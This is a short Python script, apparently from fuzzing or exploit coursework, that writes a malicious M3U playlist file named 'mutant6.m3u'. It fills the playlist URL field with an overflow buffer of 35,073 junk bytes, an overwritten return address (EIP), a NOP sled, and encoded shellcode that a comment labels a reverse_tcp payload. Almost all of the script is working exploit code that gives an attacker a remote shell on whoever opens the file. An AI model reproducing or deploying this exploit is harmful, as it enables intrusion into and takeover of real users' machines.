#Static fields
header = '#EXTM3U\r\n'
line1 = '#EXTINF:123,Sample artist - Sample title\r\n'
url_part1 = 'http://'

#String field where modification occurs hence generating a mutant.
junk1 = "\x41" *35073
eip = "\xEE\x2E\xC7\x77"
junk2 = "\x43" * 100
nops = "\x90" *16

#Buf generated from a reverse_tcp payload.
buf =  ""
buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7b\xbe\x87\x3d\x83\xee\xfc\xe2\xf4\x87\x56"
buf += "\x05\x3d\x7b\xbe\xe7\xb4\x9e\x8f\x47\x59\xf0\xee\xb7"
buf += "\xb6\x29\xb2\x0c\x6f\x6f\x35\xf5\x15\x74\x09\xcd\x1b"
buf += "\x4a\x41\x2b\x01\x1a\xc2\x85\x11\x5b\x7f\x48\x30\x7a"
buf += "\x79\x65\xcf\x29\xe9\x0c\x6f\x6b\x35\xcd\x01\xf0\xf2"
buf += "\x96\x45\x98\xf6\x86\xec\x2a\x35\xde\x1d\x7a\x6d\x0c"
buf += "\x74\x63\x5d\xbd\x74\xf0\x8a\x0c\x3c\xad\x8f\x78\x91"
buf += "\xba\x71\x8a\x3c\xbc\x86\x67\x48\x8d\xbd\xfa\xc5\x40"
buf += "\xc3\xa3\x48\x9f\xe6\x0c\x65\x5f\xbf\x54\x5b\xf0\xb2"
buf += "\xcc\xb6\x23\xa2\x86\xee\xf0\xba\x0c\x3c\xab\x37\xc3"
buf += "\x19\x5f\xe5\xdc\x5c\x22\xe4\xd6\xc2\x9b\xe1\xd8\x67"
buf += "\xf0\xac\x6c\xb0\x26\xd6\xb4\x0f\x7b\xbe\xef\x4a\x08"
buf += "\x8c\xd8\x69\x13\xf2\xf0\x1b\x7c\x41\x52\x85\xeb\xbf"
buf += "\x87\x3d\x52\x7a\xd3\x6d\x13\x97\x07\x56\x7b\x41\x52"
buf += "\x6d\x2b\xee\xd7\x7d\x2b\xfe\xd7\x55\x91\xb1\x58\xdd"
buf += "\x84\x6b\x10\x57\x7e\xd6\x47\x95\x43\xbd\xef\x3f\x7b"
buf += "\x9d\x05\xb4\x9d\xd4\x97\x6b\x2c\xd6\x1e\x98\x0f\xdf"
buf += "\x78\xe8\xfe\x7e\xf3\x31\x84\xf0\x8f\x48\x97\xd6\x77"
buf += "\x88\xd9\xe8\x78\xe8\x13\xdd\xea\x59\x7b\x37\x64\x6a"
buf += "\x2c\xe9\xb6\xcb\x11\xac\xde\x6b\x99\x43\xe1\xfa\x3f"
buf += "\x9a\xbb\x3c\x7a\x33\xc3\x19\x6b\x78\x87\x79\x2f\xee"
buf += "\xd1\x6b\x2d\xf8\xd1\x73\x2d\xe8\xd4\x6b\x13\xc7\x4b"
buf += "\x02\xfd\x41\x52\xb4\x9b\xf0\xd1\x7b\x84\x8e\xef\x35"
buf += "\xfc\xa3\xe7\xc2\xae\x05\x77\x88\xd9\xe8\xef\x9b\xee"
buf += "\x03\x1a\xc2\xae\x82\x81\x41\x71\x3e\x7c\xdd\x0e\xbb"
buf += "\x3c\x7a\x68\xcc\xe8\x57\x7b\xed\x78\xe8"





payload = junk1 + eip + junk2 +nops + buf

#Specifying the location of the mutant.
url_part2 = '.example.com/test.m3u'

#Defining what the mutant should include.
exploit = open('MT88\mutant6.m3u','w')
exploit.write(header+line1+url_part1+payload+url_part2)
